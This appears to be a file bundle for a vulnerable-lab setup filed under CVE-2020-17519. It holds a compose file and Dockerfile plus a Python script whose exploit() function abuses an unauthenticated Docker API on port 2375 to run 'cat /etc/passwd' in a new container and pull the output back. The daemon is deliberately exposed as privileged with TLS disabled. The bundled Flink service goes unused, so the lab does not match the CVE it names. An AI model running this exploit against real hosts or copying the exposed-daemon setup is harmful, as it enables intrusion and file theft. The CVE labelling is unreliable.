{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-17519/custom_no_tool/docker-compose.yml",
            "content": "services:\n  dind:\n    image: docker:19.03.11-dind\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    ports:\n      - \"2375:2375\"\n    volumes:\n      - docker-data:/var/lib/docker\n    healthcheck:\n      test: [\"CMD\", \"docker\", \"info\"]\n      interval: 5s\n      timeout: 2s\n      retries: 12\n  flink_jobmanager:\n    image: apache/flink:1.11.2\n    ports:\n      - \"8081:8081\"\n    environment:\n      - JOB_MANAGER_RPC_ADDRESS=jobmanager\n    command: jobmanager\n  vulnerable_app:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    depends_on:\n      dind:\n        condition: service_healthy\n      flink_jobmanager:\n        condition: service_started\n    environment:\n      - DOCKER_HOST=tcp://dind:2375\n    ports:\n      - \"8080:8080\"\nvolumes:\n  docker-data:\n"
        },
        {
            "location": "./../../dockers/CVE-2020-17519/custom_no_tool/Dockerfile",
            "content": "FROM python:3.9-slim-buster\nWORKDIR /app\nCOPY . /app\nRUN apt-get update && \\\n    apt-get install -y --no-install-recommends ca-certificates && \\\n    rm -rf /var/lib/apt/lists/*\nRUN pip install --no-cache-dir --upgrade pip && \\\n    pip install --no-cache-dir requests\nEXPOSE 8080\nCMD [\"python\", \"app.py\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2020-17519/custom_no_tool/app.py",
            "content": "import os, time, requests, json\n\nDOCKER_HOST = os.getenv('DOCKER_HOST', 'tcp://dind:2375')\nBASE_URL = DOCKER_HOST.rstrip('/')\n\ndef wait_for_dind(retries=30, delay=2):\n    for _ in range(retries):\n        try:\n            r = requests.get(f'{BASE_URL}/_ping', timeout=2)\n            if r.status_code == 200:\n                return True\n        except Exception:\n            pass\n        time.sleep(delay)\n    return False\n\ndef exploit():\n    if not wait_for_dind():\n        print('Docker daemon in dind not reachable, exiting')\n        return\n    url = f'{BASE_URL}/containers/create'\n    payload = {\n        'Image': 'alpine',\n        'Cmd': ['sh', '-c', 'cat /etc/passwd > /tmp/exfiltrate']\n    }\n    r = requests.post(url, json=payload)\n    if r.status_code == 201:\n        container_id = r.json()['Id']\n        start_url = f'{BASE_URL}/containers/{container_id}/start'\n        requests.post(start_url)\n        time.sleep(2)\n        cp_url = f'{BASE_URL}/containers/{container_id}/archive?path=/tmp/exfiltrate'\n        resp = requests.get(cp_url)\n        if resp.status_code == 200:\n            print('Exploit succeeded, data received:')\n            print(resp.content)\n        else:\n            print('Failed to copy file')\n    else:\n        print('Failed to create container')\n\nif __name__ == '__main__':\n    exploit()\n    while True:\n        time.sleep(60)\n"
        }
    ],
    "directory_tree": "CVE-2020-17519/custom_no_tool/\n\u251c\u2500 docker-compose.yml\n\u251c\u2500 Dockerfile\n\u2514\u2500 app.py"
}